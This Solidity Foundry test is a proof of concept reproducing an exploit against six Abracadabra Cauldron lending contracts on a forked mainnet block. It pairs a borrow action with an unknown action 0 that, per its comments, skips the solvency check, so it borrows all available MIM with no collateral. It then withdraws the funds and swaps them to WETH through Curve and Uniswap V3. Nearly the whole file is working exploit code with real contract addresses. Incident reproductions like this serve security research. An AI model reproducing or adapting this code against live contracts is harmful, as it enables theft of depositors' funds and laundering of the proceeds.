// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

// Minimal SafeTransferLib for USDT approve
library SafeTransferLib {
    function safeApprove(IERC20 token, address to, uint256 amount) internal {
        // USDT requires resetting approval to 0 first
        (bool success, bytes memory data) = address(token).call(
            abi.encodeWithSelector(IERC20.approve.selector, to, 0)
        );
        require(success && (data.length == 0 || abi.decode(data, (bool))), "APPROVE_FAILED");

        (success, data) = address(token).call(
            abi.encodeWithSelector(IERC20.approve.selector, to, amount)
        );
        require(success && (data.length == 0 || abi.decode(data, (bool))), "APPROVE_FAILED");
    }
}

interface ICauldronV4 {
    function cook(
        uint8[] calldata actions,
        uint256[] calldata values,
        bytes[] calldata datas
    ) external payable returns (uint256, uint256);

    function userBorrowPart(address user) external view returns (uint256);
    function userCollateralShare(address user) external view returns (uint256);
    function totalBorrow() external view returns (uint128 elastic, uint128 base);
    function totalCollateralShare() external view returns (uint256);
    function borrowLimit() external view returns (uint128 total, uint128 borrowPartPerAddress);
}

interface IDegenBox {
    function balanceOf(address token, address user) external view returns (uint256);
    function toAmount(address token, uint256 share, bool roundUp) external view returns (uint256);
    function totals(address token) external view returns (uint128 elastic, uint128 base);
    function withdraw(
        address token,
        address from,
        address to,
        uint256 amount,
        uint256 share
    ) external returns (uint256 amountOut, uint256 shareOut);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface ICurveMIMPool {
    function exchange(
        int128 i,
        int128 j,
        uint256 dx,
        uint256 min_dy
    ) external returns (uint256);
}

interface ICurve3Pool {
    function remove_liquidity_one_coin(uint256 token_amount, int128 i, uint256 min_amount) external;
}

interface IUniswapV3Router {
    struct ExactInputParams {
        bytes path;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
    }

    function exactInput(
        ExactInputParams calldata params
    ) external payable returns (uint256 amountOut);
}

contract AbracadabraExploitTest is Test {
    // The 6 exploited Cauldrons
    ICauldronV4[6] cauldrons;

    // Contract addresses
    IDegenBox constant degenBox = IDegenBox(0xd96f48665a1410C0cd669A88898ecA36B9Fc2cce);
    IERC20 constant MIM = IERC20(0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3);

    address constant CURVE_ROUTER = 0x45312ea0eFf7E09C83CBE249fa1d7598c4C8cd4e;
    address constant CURVE_3POOL = 0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7;
    address constant UNISWAP_V3_ROUTER = 0xE592427A0AEce92De3Edee1F18E0157C05861564;

    // Token addresses
    address constant THREE_CRV = 0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490;
    address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    // Pool addresses
    address constant MIM_3CRV_POOL = 0x5a6A4D54456819380173272A5E8E9B9904BdF41B;

    address constant attacker = 0x1AaaDe3e9062d124B7DeB0eD6DDC7055EFA7354d;

    // Action constants
    uint8 constant ACTION_BORROW = 5;

    // Curve MIM/3CRV pool indices
    int128 constant MIM_INDEX = 0;
    int128 constant THREE_CRV_INDEX = 1;

    // Pool indices for 3Pool (DAI=0, USDC=1, USDT=2)
    int128 constant USDT_INDEX = 2;

    // Uniswap V3 fee tier
    uint24 constant UNISWAP_V3_FEE_TIER = 500; // 0.05%

    // MIM price = $1 (stablecoin)
    uint256 constant MIM_PRICE_USD = 1e18;

    // 1 recipient per Cauldron (6 addresses total)
    address[6] recipients;

    function setUp() public {
        // Fork at the real exploit block (1 block before attack)
        vm.createSelectFork("mainnet", 23504544);

        // The 6 vulnerable Cauldrons
        cauldrons[0] = ICauldronV4(0x46f54d434063e5F1a2b2CC6d9AAa657b1B9ff82c);
        cauldrons[1] = ICauldronV4(0x289424aDD4A1A503870EB475FD8bF1D586b134ED);
        cauldrons[2] = ICauldronV4(0xce450a23378859fB5157F4C4cCCAf48faA30865B);
        cauldrons[3] = ICauldronV4(0x40d95C4b34127CF43438a963e7C066156C5b87a3);
        cauldrons[4] = ICauldronV4(0x6bcd99D6009ac1666b58CB68fB4A50385945CDA2);
        cauldrons[5] = ICauldronV4(0xC6D3b82f9774Db8F92095b5e4352a8bB8B0dC20d);

        // 1 recipient per Cauldron
        recipients[0] = makeAddr("recipient1");
        recipients[1] = makeAddr("recipient2");
        recipients[2] = makeAddr("recipient3");
        recipients[3] = makeAddr("recipient4");
        recipients[4] = makeAddr("recipient5");
        recipients[5] = makeAddr("recipient6");

        vm.label(address(degenBox), "DegenBox");
        vm.label(address(MIM), "MIM");
        vm.label(attacker, "Attacker");
    }

    function testExploit_Full_Drain() public {
        console.log("================================================================");
        console.log("       ABRACADABRA MULTI-CAULDRON EXPLOIT - POC                ");
        console.log("================================================================");
        console.log("");

        console.log("EXPLOITING 6 CAULDRONS (1 address per Cauldron)");
        console.log("----------------------------------------------------------------");
        console.log("");

        vm.startPrank(attacker);

        uint256 totalStolen = 0;
        uint256 successfulBorrows = 0;

        // Exploit each Cauldron with its dedicated address
        for (uint i = 0; i < 6; i++) {
            console.log("=== CAULDRON", i + 1, "===");
            console.log("Address:", address(cauldrons[i]));

            // Check available MIM in this Cauldron
            uint256 cauldronShares = degenBox.balanceOf(address(MIM), address(cauldrons[i]));
            uint256 cauldronMIM = degenBox.toAmount(address(MIM), cauldronShares, false);

            console.log("  MIM available:", cauldronMIM / 1e18, "MIM");

            // Check borrow limit
            (uint256 borrowLimit,) = cauldrons[i].borrowLimit();
            console.log("  Borrow limit:", borrowLimit);

            if (borrowLimit < cauldronShares) {
                console.log("  [SKIP] Borrow limit too low");
                console.log("");
                continue;
            }

            if (cauldronMIM < 1000 ether) {
                console.log("  [SKIP] Not enough MIM in this Cauldron");
                console.log("");
                continue;
            }

            // Use available amount directly
            uint256 borrowAmount = cauldronMIM;

            console.log("  Borrowing:", borrowAmount / 1e18, "MIM");
            console.log("  Recipient:", recipients[i]);

            uint8[] memory actions = new uint8[](2);
            uint256[] memory values = new uint256[](2);
            bytes[] memory datas = new bytes[](2);

            // Action 0: BORROW to recipient[i]
            actions[0] = ACTION_BORROW;
            values[0] = 0;
            datas[0] = abi.encode(int256(borrowAmount), recipients[i]);

            // Action 1: Unknown action (0) - bypass solvency check
            actions[1] = 0;
            values[1] = 0;
            datas[1] = "";

            // Execute the exploit on this Cauldron
            try cauldrons[i].cook(actions, values, datas) {
                // Check balance in DegenBox
                uint256 stolenFromThisCauldron = degenBox.balanceOf(address(MIM), recipients[i]);
                totalStolen += stolenFromThisCauldron;
                successfulBorrows++;

                console.log("  [SUCCESS] Stolen:", stolenFromThisCauldron / 1e18, "MIM");
            } catch Error(string memory reason) {
                console.log("  [FAILED]", reason);
            } catch {
                console.log("  [FAILED] Unknown error");
            }

            console.log("");
        }

        console.log("");
        console.log("=== WITHDRAWING MIM FROM DEGENBOX ===");
        console.log("");

        // Withdraw MIM from each recipient to their wallet
        for (uint i = 0; i < 6; i++) {
            uint256 recipientShares = degenBox.balanceOf(address(MIM), recipients[i]);

            if (recipientShares > 0) {
                if (i == 0) console.log("Recipient 1 - Withdrawing", recipientShares / 1e18, "MIM shares");
                if (i == 1) console.log("Recipient 2 - Withdrawing", recipientShares / 1e18, "MIM shares");
                if (i == 2) console.log("Recipient 3 - Withdrawing", recipientShares / 1e18, "MIM shares");
                if (i == 3) console.log("Recipient 4 - Withdrawing", recipientShares / 1e18, "MIM shares");
                if (i == 4) console.log("Recipient 5 - Withdrawing", recipientShares / 1e18, "MIM shares");
                if (i == 5) console.log("Recipient 6 - Withdrawing", recipientShares / 1e18, "MIM shares");

                // Withdraw must be done from the address holding the shares
                // Switch to recipient to perform withdrawal
                vm.stopPrank();
                vm.startPrank(recipients[i]);

                try degenBox.withdraw(
                    address(MIM),
                    recipients[i],
                    recipients[i],
                    0, // amount = 0 means use shares
                    recipientShares
                ) returns (uint256 amountOut, uint256) {
                    console.log("  -> Withdrawn:", amountOut / 1e18, "MIM to wallet");
                    console.log("  -> Wallet balance:", MIM.balanceOf(recipients[i]) / 1e18, "MIM");
                } catch Error(string memory reason) {
                    console.log("  [!] Withdraw failed:", reason);
                } catch {
                    console.log("  [!] Withdraw failed (unknown reason)");
                }

                vm.stopPrank();
                vm.startPrank(attacker);
            }
        }

        vm.stopPrank();

        console.log("");
        console.log("EXPLOIT SUMMARY");
        console.log("================================================================");

        // Final distribution across wallets
        console.log("MIM DISTRIBUTION ACROSS 6 WALLETS:");
        console.log("----------------------------------------------------------------");
        uint256 totalInWallets = 0;
        for (uint i = 0; i < 6; i++) {
            uint256 walletBalance = MIM.balanceOf(recipients[i]);
            if (walletBalance > 0) {
                console.log("  Wallet address:", recipients[i]);
                console.log("  Balance:", walletBalance / 1e18, "MIM");
                totalInWallets += walletBalance;
            }
        }
        console.log("  ---");
        console.log("  TOTAL in wallets:", totalInWallets / 1e18, "MIM");
        console.log("");

        // Calculate USD value (MIM = $1 stablecoin)
        uint256 totalUSD = (totalInWallets * MIM_PRICE_USD) / 1e18;

        console.log("Successful Cauldrons exploited:", successfulBorrows, "/6");
        console.log("Total MIM in DegenBox:", totalStolen / 1e18, "MIM");
        console.log("Total MIM withdrawn:", totalInWallets / 1e18, "MIM");
        console.log("");
        console.log("FINANCIAL IMPACT:");
        console.log("----------------------------------------------------------------");
        console.log("  Total Value: $", totalUSD / 1e18, "USD");
        console.log("  Collateral: 0 (ZERO!)");
        console.log("");
        console.log("[SUCCESS] Multi-Cauldron exploit completed!");
        console.log("[SUCCESS] Total stolen: $", totalUSD / 1e18, "USD");
        console.log("[SUCCESS] Cauldrons exploited:", successfulBorrows);
        console.log("");

        assertGt(totalStolen, 0, "Exploit failed");

        // Now convert MIM to WETH through swaps
        console.log("");
        console.log("=== STARTING CONVERSION TO WETH ===");
        console.log("================================================================");
        console.log("");

        // Consolidate all MIM to attacker
        vm.startPrank(attacker);
        uint256 totalMIM = 0;
        for (uint i = 0; i < 6; i++) {
            uint256 recipientMIM = MIM.balanceOf(recipients[i]);
            if (recipientMIM > 0) {
                vm.stopPrank();
                vm.startPrank(recipients[i]);
                MIM.approve(attacker, recipientMIM);
                IERC20(address(MIM)).transfer(attacker, recipientMIM);
                totalMIM += recipientMIM;
                vm.stopPrank();
                vm.startPrank(attacker);
            }
        }

        console.log("Total MIM consolidated:", totalMIM / 1e18, "MIM");
        console.log("");

        // Step 1: Swap MIM to 3CRV
        console.log("STEP 1: Swapping MIM to 3CRV via Curve...");
        _swapMIMTo3Crv();
        uint256 threeCrvBalance = IERC20(THREE_CRV).balanceOf(attacker);
        console.log("  Received:", threeCrvBalance / 1e18, "3CRV");
        console.log("");

        // Step 2: Remove liquidity from 3Pool to USDT
        console.log("STEP 2: Removing liquidity from 3Pool to USDT...");
        _remove3PoolLiquidityToUSDT();
        uint256 usdtBalance = IERC20(USDT).balanceOf(attacker);
        console.log("  Received:", usdtBalance / 1e6, "USDT");
        console.log("");

        // Step 3: Swap USDT to WETH
        console.log("STEP 3: Swapping USDT to WETH via Uniswap V3...");
        _swapUSDTToWETH();
        uint256 wethBalance = IERC20(WETH).balanceOf(attacker);
        console.log("  Received:", wethBalance / 1e18, "WETH");
        console.log("");

        vm.stopPrank();

        console.log("=== FINAL SUMMARY ===");
        console.log("================================================================");
        console.log("Final WETH balance:", wethBalance / 1e18, "WETH");
        console.log("Exploit completed successfully!");
        console.log("");
    }

    function _swapMIMTo3Crv() internal {
        uint256 mimAmount = MIM.balanceOf(attacker);
        MIM.approve(MIM_3CRV_POOL, mimAmount);

        // Swap directly on MIM/3CRV pool: MIM (index 0) -> 3CRV (index 1)
        ICurveMIMPool(MIM_3CRV_POOL).exchange(MIM_INDEX, THREE_CRV_INDEX, mimAmount, 0);
    }

    function _remove3PoolLiquidityToUSDT() internal {
        uint256 threeCrvBalance = IERC20(THREE_CRV).balanceOf(attacker);
        IERC20(THREE_CRV).approve(CURVE_3POOL, threeCrvBalance);

        // Remove liquidity as USDT only (index 2 in the 3Pool: DAI=0, USDC=1, USDT=2)
        ICurve3Pool(CURVE_3POOL).remove_liquidity_one_coin(threeCrvBalance, USDT_INDEX, 0);
    }

    function _swapUSDTToWETH() internal {
        uint256 usdtBalance = IERC20(USDT).balanceOf(attacker);
        if (usdtBalance > 0) {
            // Use SafeTransferLib for USDT approve (USDT has non-standard approve)
            SafeTransferLib.safeApprove(IERC20(USDT), UNISWAP_V3_ROUTER, usdtBalance);

            IUniswapV3Router.ExactInputParams memory params = IUniswapV3Router.ExactInputParams({
                path: abi.encodePacked(USDT, UNISWAP_V3_FEE_TIER, WETH),
                recipient: attacker,
                deadline: block.timestamp,
                amountIn: usdtBalance,
                amountOutMinimum: 0
            });

            IUniswapV3Router(UNISWAP_V3_ROUTER).exactInput(params);
        }
    }

    receive() external payable {}
}
